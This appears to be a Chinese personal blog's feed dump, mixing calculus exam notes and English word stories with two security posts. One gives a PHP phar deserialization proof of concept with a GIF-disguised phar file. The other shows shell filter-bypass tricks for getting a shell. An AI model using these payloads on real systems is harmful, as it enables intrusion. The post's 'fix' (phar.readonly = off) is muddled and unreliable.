<iframe src="//player.bilibili.com/player.html?aid=711730464&bvid=BV1tD4y127U7&cid=224472912&page=16" width="600" height="700" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>一元函数微分学</title>
    <url>/2021/08/07/%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6/</url>
    <content><![CDATA[<h3 id="关于原函数的存在性："><a href="#关于原函数的存在性：" class="headerlink" title="关于原函数的存在性："></a>关于原函数的存在性：</h3><p>f(x)在区间<em><strong>I</strong></em>上连续  –&gt;  存在原函数</p>
<p>但存在原函数   不可以推出   f(x)在区间<em><strong>I</strong></em>上连续</p>
<p>若f(x)在区间<em><strong>I</strong></em>上有第一类间断点，则f(x)在区间***/***上无原函数</p>
<h3 id="基本公式"><a href="#基本公式" class="headerlink" title="基本公式"></a>基本公式</h3><p><img src="https://ckcah.github.io/images/math/3/image-20210806120028266.png" alt="image-20210806120028266"></p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806120052859.png" alt="image-20210806120052859"></p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806120134960.png" alt="image-20210806120134960"></p>
<h3 id="无理积分"><a href="#无理积分" class="headerlink" title="无理积分"></a>无理积分</h3><p><img src="https://ckcah.github.io/images/math/3/image-20210806121133718.png" alt="image-20210806121133718"></p>
<h1 id="三角形有理式积分"><a href="#三角形有理式积分" class="headerlink" title="三角形有理式积分"></a>三角形有理式积分</h1><p><img src="https://ckcah.github.io/images/math/3/image-20210810121847061.png" alt="image-20210810121847061"></p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210810121900312.png" alt="image-20210810121900312"></p>
<h2 id="特殊方法（三角变形、换元、分部）"><a href="#特殊方法（三角变形、换元、分部）" class="headerlink" title="特殊方法（三角变形、换元、分部）"></a>特殊方法（三角变形、换元、分部）</h2><p><img src="https://ckcah.github.io/images/math/3/image-20210810121811899.png" alt="image-20210810121811899"></p>
<h3 id="可积性"><a href="#可积性" class="headerlink" title="可积性"></a>可积性</h3><p><img src="https://ckcah.github.io/images/math/3/image-20210806121412662.png" alt="image-20210806121412662"></p>
<h3 id="定积分的计算"><a href="#定积分的计算" class="headerlink" title="定积分的计算"></a>定积分的计算</h3><p>牛顿 - 莱布尼兹公式</p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806121615915.png" alt="image-20210806121615915"></p>
<p>换元积分法</p>
<p>分部积分法</p>
<p>利用奇偶性和周期性</p>
<p>利用公式</p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806121710393.png" alt="image-20210806121710393"></p>
<h3 id="变上限积分"><a href="#变上限积分" class="headerlink" title="变上限积分"></a>变上限积分</h3><p><img src="https://ckcah.github.io/images/math/3/image-20210806121805457.png" alt="image-20210806121805457"></p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806121819605.png" alt="image-20210806121819605"></p>
<h3 id="定积分的性质"><a href="#定积分的性质" class="headerlink" title="定积分的性质"></a>定积分的性质</h3><p><img src="https://ckcah.github.io/images/math/3/image-20210806121850918.png" alt="image-20210806121850918"></p>
<p>积分中值定理</p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806121930716.png" alt="image-20210806121930716"></p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806121948298.png" alt="image-20210806121948298"></p>
<h3 id="变上限积分函数及其应用"><a href="#变上限积分函数及其应用" class="headerlink" title="变上限积分函数及其应用"></a>变上限积分函数及其应用</h3><p><img src="https://ckcah.github.io/images/math/3/image-20210806122328066.png" alt="image-20210806122328066"></p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806122358433.png" alt="image-20210806122358433"></p>
<p>关于奇偶性</p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806122547859.png" alt="image-20210806122547859"></p>
<h3 id="反常积分"><a href="#反常积分" class="headerlink" title="反常积分"></a>反常积分</h3><p><img src="https://ckcah.github.io/images/math/3/image-20210806122822599.png" alt="image-20210806122822599"></p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806123931164.png" alt="image-20210806123931164"></p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806123957066.png" alt="image-20210806123957066"></p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806124159328.png" alt="image-20210806124159328"></p>
<h3 id="定积分的应用"><a href="#定积分的应用" class="headerlink" title="定积分的应用"></a>定积分的应用</h3><p><img src="https://ckcah.github.io/images/math/3/image-20210806124314202.png" alt="image-20210806124314202"></p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806124332551.png" alt="image-20210806124332551"></p>
<h3 id="曲线弧长、旋转测体积"><a href="#曲线弧长、旋转测体积" class="headerlink" title="曲线弧长、旋转测体积"></a>曲线弧长、旋转测体积</h3><p><img src="https://ckcah.github.io/images/math/3/image-20210806124451274.png" alt="image-20210806124451274"></p>
<p><img src="https://ckcah.github.io/images/math/3/image-20210806124509958.png" alt="image-20210806124509958"></p>
<h3 id="物理应用"><a href="#物理应用" class="headerlink" title="物理应用"></a>物理应用</h3><p><img src="https://ckcah.github.io/images/math/3/image-20210806124524606.png" alt="image-20210806124524606"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>数学</category>
        <category>定义篇</category>
        <category>高数</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>一天一个小故事21-08-15</title>
    <url>/2021/08/15/%E4%B8%80%E5%A4%A9%E4%B8%80%E4%B8%AA%E5%B0%8F%E6%95%85%E4%BA%8B21-08-15/</url>
    <content><![CDATA[<p><em><strong>deluge</strong></em>专指大洪水，还可以比喻成各种洪水一般的事物。</p>
<p>相传是上帝创造人后，看到人类的胡作非为后，想要毁掉人类，所以就发了大洪水。</p>
<p>而<em><strong>flood</strong></em>指的是实际的洪水这一自然灾害。</p>
<p>还有一个<em><strong>antediluvian</strong></em>，adj：大洪水前的、远古的、陈旧的，年迈的人、不合时宜的人</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>一天一个小故事</category>
        <category>英语</category>
        <category>随记</category>
        <category>有趣的新发现</category>
      </categories>
      <tags>
        <tag>知识浅薄的证明</tag>
      </tags>
  </entry>
  <entry>
    <title>story21.08.05</title>
    <url>/2021/08/05/story21-08-05/</url>
    <content><![CDATA[<p>因自恋而化为水仙的美男子纳西索斯希腊神话中，纳西索斯（Narcissus）是河神 Cephisus 和宁芙仙女 Liriope 的儿子。当他出生不久后，他母亲向盲先知提瑞西阿斯（Tiresias）询问儿子的命运。先知回答：“只要你的儿子没有见过自己，就能长命百岁。” </p>
<p>纳西索斯长大后，成为了绝世美少年，引得无数凡人与神女的爱慕，却将他们无情拒绝——其中最有名的便是回声女神艾柯（Echo）。众女神对他愤怒不已，向报应女神 Nemesis 祷告，诅咒他永远得不到自己所爱的东西。这个诅咒很快就生效了。有一天，纳西索斯去打猎，口渴后准备到河边喝水。悲剧发生了，纳西索斯看见了自己在水中的倒影，立刻被这张无比英俊的脸庞迷住了，对其产生了狂热的爱情。他一面追求，同时又被追求；他燃起爱情，又被爱情焚烧。他寝食难安，呆在湖边不肯离去，最后奄奄一息，化为一株水仙花，依然留在水边守望着自己在水中的倒影。水仙的名字（narcissus）就来自纳西索斯的名字 Narcissus，该单词还是“自恋狂”的代名词，</p>
<p>并衍生了narcissism（自恋）等英语单词。</p>
<p><img src="https://ckcah.github.io/images/story/image-20210805061044501.png" alt="image-20210805061044501"></p>
<p>narcissus：[nɑr’sɪsəs] n.水仙，自恋狂，纳西索斯</p>
<p>narcissism：[‘nɑːsɪsɪz(ə)m; nɑː’sɪs-] n.自恋，自我陶醉，自恋症</p>
<p>narcissist：[nɑː’sɪsɪst] n.自恋者，自我陶醉者</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>一天一个小故事</category>
      </categories>
      <tags>
        <tag>知识浅薄的证明</tag>
      </tags>
  </entry>
  <entry>
    <title>一天一个小故事21.08.04</title>
    <url>/2021/08/04/%E4%B8%80%E5%A4%A9%E4%B8%80%E4%B8%AA%E5%B0%8F%E6%95%85%E4%BA%8B21-08-04/</url>
    <content><![CDATA[<p>​        斯芬克斯（Sphinx）最早源于古埃及神话，是长翅膀的怪物，通常是雄性，是仁慈和高贵的象征，包括三种：人面狮身的Androsphinx、羊头狮身的 Criosphinx 和鹰头狮身的Hierocosphinx。但在希腊神话中，斯芬克斯变成了雌性，代表着“神的惩罚”。据说，天后赫拉派斯芬克斯坐在底比斯城附近的悬崖上，用缪斯所传授的谜语考验路人：什么东西早晨四条腿，中午两条腿，晚上三条腿？猜不出谜语的人就会被它吃掉。</p>
<p>​        俄狄浦斯猜出了斯芬克斯的谜语，谜底是“人”，因为人在婴儿阶段四脚着地爬着走，长大后用两只脚走路，年老体弱后拄着拐杖走。看到自己的谜语被猜中，斯芬克斯于是在羞愧中跳崖而死。</p>
<p>在英语中，斯芬克斯的名字 sphinx 比喻“难以理解的人”，习语 riddle of sphinx 比喻难题。</p>
<p>sphinx：[sfɪŋks] n.难以理解的人，斯芬克斯，（古埃及的）狮身人面像</p>
<p>riddle of sphinx：n.难题，难解之谜</p>
<p>确实很难以理解</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>一天一个小故事</category>
      </categories>
      <tags>
        <tag>知识浅薄的证明</tag>
      </tags>
  </entry>
  <entry>
    <title>二重积分解题思路篇</title>
    <url>/2021/08/08/%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%E7%AF%87/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/math/6/image-20210808103911691.png" alt="image-20210808103911691"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>数学</category>
        <category>思维导图</category>
        <category>解题思路篇</category>
        <category>高数</category>
        <category>数学</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>关于区块链和信息安全以及网络安全</title>
    <url>/2021/08/12/%E5%85%B3%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BB%A5%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<p>关于区块链，是我最新发现的，其实也正好作为新的研究方向，我的渗透有点不想搞了。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>自我探索</category>
        <category>网络安全</category>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>区块链</tag>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>关于phar反序列化漏洞挖掘</title>
    <url>/2020/07/31/%E5%85%B3%E4%BA%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>说到PHP反序列化，大概就是围绕serialize()，unserialize()这两个函数</p>
<p>序列化说通俗点就是把一个对象变成可以传输的字符串</p>
<p>那反序列化不就是颠转过来吗</p>
<h4 id="反序列化漏洞造成原因"><a href="#反序列化漏洞造成原因" class="headerlink" title="反序列化漏洞造成原因"></a>反序列化漏洞造成原因</h4><p>服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成很严重的漏洞了</p>
<h3 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h3><p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p>
<h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p>简单来说<code>phar</code>就是<code>php</code>压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<code>file://</code> <code>php://</code>等类似，也是一种流包装器。</p>
<p><code>phar</code>结构由 4 部分组成</p>
<ul>
<li><code>stub</code> phar 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；</code></li>
<li><code>manifest</code> 压缩文件的属性等信息，以<strong>序列化</strong>存储，是主要的攻击点。</li>
<li><code>contents</code> 压缩文件的内容；</li>
<li><code>signature</code> 签名，放在文件末尾；</li>
</ul>
<p>这里有两个关键点，一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者<code>pdf</code>文件来绕过一些上传限制；二是反序列化，<code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化，而这样的文件操作函数有很多。</p>
<table>
<thead>
<tr>
<th>受影响函数列表</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody></table>
<h4 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h4><p>phar反序列化可以不用unserialize函数的可控，只需要满足上面的危险函数可控，就可以造成反序列化的攻击，大大增加了反序列化漏洞的挖掘。这里，利用以下代码生成phar文件</p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> class A&#123;</span><br><span class="line">   public $name;</span><br><span class="line">   public function __construct()&#123;</span><br><span class="line">     echo &quot;对象创建调用&lt;br&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   public function __destruct()&#123;</span><br><span class="line">     eval($this-&gt;name);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($_GET[&#x27;file&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>发现函数file_exists,存在危险函数可控</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">     class A &#123;</span><br><span class="line">         public function __construct()&#123;</span><br><span class="line">            $this-&gt;name = &#x27;phpinfo();&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     @unlink(&quot;phar.phar&quot;);</span><br><span class="line">     $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new A();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>phar文件是通过stub来标识的，是通过xxx<?php xxx.__HALT_COMPILER(); ?>来判断的，所以对后缀并没有要求，修改成gif，通过图片的上传点，上传到目标服务器，在利用phar://协议执行pahr文件。</p>
<h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><p>在php.ini中需要设置phar.readonly为off，不是无法生成phar文件</p>
<p><code>phar.readonly = off</code></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>关于对陈兔兔的后续感叹与反思</title>
    <url>/2021/08/05/%E5%85%B3%E4%BA%8E%E5%AF%B9%E9%99%88%E5%85%94%E5%85%94%E7%9A%84%E5%90%8E%E7%BB%AD%E6%84%9F%E5%8F%B9%E4%B8%8E%E5%8F%8D%E6%80%9D/</url>
    <content><![CDATA[<p>原本是想去陈老师的公众号翻一下有没有关于英语精读的方法文章，偶然发现了陈老师对单词原本含义的解释。大概意思就是，比如一个单词，interesting，陈老师说的，他其实也会表不好的意思，并且陈老师会经常<strong>查文献</strong>，用文献来充实自己。</p>
<p>基于这一点，我于是在之前数次的阅读中效仿这个方法，但是我，好像还是没能找到这么细致，也不知道怎么找到相关文献。于是我就用自己的<strong>野方法</strong>，先去搜关于如何精读的文章，然后我就发现了一些他们推荐的权威查词查字查短语的网站，然后就把这个单词输入进去，看和陈老师说的一样的网站解释，于是我发现了这个</p>
<p><em><strong>interesting</strong></em></p>
<p>When you’re giving a speech, you probably hope that your audience is gazing at you in fascination because what you’re saying is so <em>interesting</em>, and not because you’ve got something weird on your face.</p>
<blockquote>
<p>The adjective <em>interesting</em> describes something that makes you curious, or catches your attention, but sometimes people use the word in a doubtful way when they are taken aback but want to be polite. Like if your grandmother looks at your new tattoo and says, “Well, that’s certainly <em>interesting</em>!” Chances are she’s not actually feeling very enthusiastic about your choice of body art.</p>
</blockquote>
<p>但是这只是用网站查了，而陈老师是直接找的文献，读的文献，这一点，至少我做不到。</p>
<p>不过这个网站我记住了，以后查词的时候我一定看完。</p>
<p>但又有另一个点困惑我，interesting这个词算是简单的词汇，陈老师能有时间去发现，可是在我读的过程中，是没有这么多时间精读的，所以，只能靠时间去堆积，说不定英语看多了就能发现这些规律。</p>
<p>遗憾的是陈老师没有其他的著作，除开考研以外，我暂时找不到一个可以和陈老师匹拟的人。</p>
<p>从陈老师那里，我也明白了对一件事情需要认真到什么程度。考研加油！</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>自我探索</category>
        <category>英语</category>
        <category>陈仲凯老师</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title>双端RAM和多模块存储器</title>
    <url>/2021/08/14/%E5%8F%8C%E7%AB%AFRAM%E5%92%8C%E5%A4%9A%E6%A8%A1%E5%9D%97%E5%AD%98%E5%82%A8%E5%99%A8/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io//images/CO/image-20210814161549219.png" alt="image-20210814161549219"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>思维导图</category>
        <category>408</category>
        <category>408</category>
        <category>CO</category>
        <category>CO</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>向量代数与空间解析几何及多元微分学在几何上的应用-定义篇</title>
    <url>/2021/08/19/%E5%90%91%E9%87%8F%E4%BB%A3%E6%95%B0%E4%B8%8E%E7%A9%BA%E9%97%B4%E8%A7%A3%E6%9E%90%E5%87%A0%E4%BD%95%E5%8F%8A%E5%A4%9A%E5%85%83%E5%BE%AE%E5%88%86%E5%AD%A6%E5%9C%A8%E5%87%A0%E4%BD%95%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/math/8/image-20210819080712502.png" alt="image-20210819080712502"></p>
<p><img src="https://ckcah.github.io/images/math/8/image-20210819080808929.png" alt="image-20210819080808929"></p>
<p><img src="https://ckcah.github.io/images/math/8/image-20210819080835709.png" alt="image-20210819080835709"></p>
<p><img src="https://ckcah.github.io/images/math/8/image-20210819081112492.png" alt="image-20210819081112492"></p>
<p><img src="https://ckcah.github.io/images/math/8/image-20210819081323931.png" alt="image-20210819081323931"></p>
<p><img src="https://ckcah.github.io/images/math/8/image-20210819081340005.png" alt="image-20210819081340005"></p>
<p><img src="https://ckcah.github.io/images/math/8/image-20210819081519572.png" alt="image-20210819081519572"></p>
<p><img src="https://ckcah.github.io/images/math/8/image-20210819081534786.png" alt="image-20210819081534786"></p>
<p><img src="https://ckcah.github.io/images/math/8/image-20210819081552212.png" alt="image-20210819081552212"></p>
<p><img src="https://ckcah.github.io/images/math/8/image-20210819081733150.png" alt="image-20210819081733150"></p>
<p><img src="https://ckcah.github.io/images/math/8/image-20210819081840456.png" alt="image-20210819081840456"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>数学</category>
        <category>定义篇</category>
        <category>高数</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行绕过</title>
    <url>/2020/08/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p><strong>keyword：我只是互联网的搬运工</strong></p>
<p><strong>转载：<a href="https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&amp;mid=2247484463&amp;idx=1&amp;sn=2f9aaaec02859a920fac483bc8c8c146&amp;chksm=e824a3f6df532ae0fcdb41c95221468e0fca07d7bbcf4c1723fd34f2dba725d9e52180ce3cf6&amp;mpshare=1&amp;scene=24&amp;srcid=0717WOvidxHw0avSAD5yV7bE&amp;sharer_sharetime=1594999264244&amp;sharer_shareid=9cfbb554b3422268f4530d007f9754e4#rd">https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&amp;mid=2247484463&amp;idx=1&amp;sn=2f9aaaec02859a920fac483bc8c8c146&amp;chksm=e824a3f6df532ae0fcdb41c95221468e0fca07d7bbcf4c1723fd34f2dba725d9e52180ce3cf6&amp;mpshare=1&amp;scene=24&amp;srcid=0717WOvidxHw0avSAD5yV7bE&amp;sharer_sharetime=1594999264244&amp;sharer_shareid=9cfbb554b3422268f4530d007f9754e4#rd</a></strong></p>
<h1 id="Linux篇"><a href="#Linux篇" class="headerlink" title="Linux篇"></a>Linux篇</h1><h3 id="命令拼接"><a href="#命令拼接" class="headerlink" title="命令拼接"></a>命令拼接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=who</span><br><span class="line">b=ami</span><br><span class="line">$a$b //输出whoami</span><br></pre></td></tr></table></figure>



<h3 id="常用字符使用"><a href="#常用字符使用" class="headerlink" title="常用字符使用"></a>常用字符使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;            表示将任务置于后台执行</span><br><span class="line">;            多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line">&amp;&amp;           只有在 &amp;&amp; 左边的命令返回真(命令返回值 $? == 0),&amp;&amp;右边的命令才会被执行。</span><br><span class="line">||           只有在 || 左边的命令返回假(命令返回值 $? == 1),||右边的命令才会被执行。</span><br><span class="line">%0a</span><br><span class="line">%0d</span><br><span class="line">| (管道符)     |表示管道，上一条命令的输出，作为下一条命令的参数</span><br></pre></td></tr></table></figure>

<p>例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo qwe ; ls 				//会先输出字符qwe,然后执行ls</span><br><span class="line">q=l; w=s; e=&quot; -al&quot;; $q$w$e 	//执行ls -al命令</span><br><span class="line">qwe | ls 					//执行后面的命令,前面的不执行</span><br></pre></td></tr></table></figure>

<p>这些都可以自己去试试…这些字符最多用到的就是<code>;</code>和<code>|</code>就先只说最常用的了…</p>
<span id="more"></span> 

<h3 id="利用Linux的环境变量"><a href="#利用Linux的环境变量" class="headerlink" title="利用Linux的环境变量"></a>利用Linux的环境变量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $&#123;PATH&#125;	///usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"></span><br><span class="line">echo $&#123;PATH:1:9&#125;//usr/local</span><br></pre></td></tr></table></figure>

<p>可以通过截断和拼接来得到我们想要的来getshell</p>
